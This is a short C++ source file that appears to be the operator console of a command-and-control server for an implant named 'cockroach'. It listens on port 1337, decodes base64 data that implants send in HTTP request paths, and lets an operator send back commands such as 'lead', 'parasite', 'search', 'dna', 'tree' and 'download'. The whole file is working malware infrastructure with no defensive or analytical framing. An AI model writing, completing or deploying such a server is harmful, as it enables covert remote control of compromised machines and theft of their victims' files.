#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <vector>
#include <string>
#include <iostream>
#include <unistd.h>
#include "./utils/split.hpp"
#include "./b64/b64.hpp"

#define IP "127.0.0.1"
#define PORT "1337"

int main(int argc, char *argv[]) {
  int cockroach, stingroach, larva;

  cockroach = socket(AF_INET, SOCK_STREAM, 0);

  struct in_addr ip;
  sockaddr_in sockaddr;
  sockaddr.sin_family = AF_INET;
  inet_aton(IP, &ip);
  sockaddr.sin_addr.s_addr = ip.s_addr;
  sockaddr.sin_port = htons(atoi(PORT));

  stingroach = bind(cockroach, (struct sockaddr*)&sockaddr, sizeof(sockaddr));
 
  larva = listen(cockroach, 10);

  for(;;) {
    auto addrlen = sizeof(sockaddr);
    int parasite = accept(cockroach, (struct sockaddr*)&sockaddr, (socklen_t*)&addrlen);

    std::vector<char> buffer(2048);
    auto bytesRead = read(parasite, &buffer[0], buffer.size());
    std::string bufferOut (buffer.begin(), buffer.end());
    std::cout << "Recv: " << bufferOut << std::endl;

    std::vector<std::string> pathHolder = {};;
    pathHolder = split(bufferOut, " ");
    std::string prepath = pathHolder[1];
    pathHolder = split(prepath, "base64:");
    std::string path = base64_decode(pathHolder[1]);
   
    std::cout << "Path:";
    for(int i = 0; i < path.size(); ++i) {
      std::cout << path[i];
    }

    std::cout << std::endl;


    std::string serverResponse = "HTTP/1.1 200 ok\r\n\r\n";
    if (bufferOut[5] == 'c' && bufferOut[6] == 'r' && bufferOut[7] == 'r' && bufferOut[8] == 'r') {
      std::string input = "";
      std::string mode = "";
      std::cout << "Biomechanics:\n"
      "lead,parasite,search,auto,dna" << std::endl;
      std::getline(std::cin, mode);;
      std::cout << "How to " << mode << " the cockroach?" << std::endl;
      mode += ":";
      
      if (mode == "auto:") {
        mode = "lead:";
        std::cout << "1. tree.\n"
	"2. download\n";

      }
      std::getline(std::cin, input);


      serverResponse += mode;
      serverResponse += input;
    } 
    serverResponse += "\r\n\r\n\r\n";
    send(parasite, serverResponse.c_str(), serverResponse.size(), 0);

    close(parasite);
  }


  return 0;
}
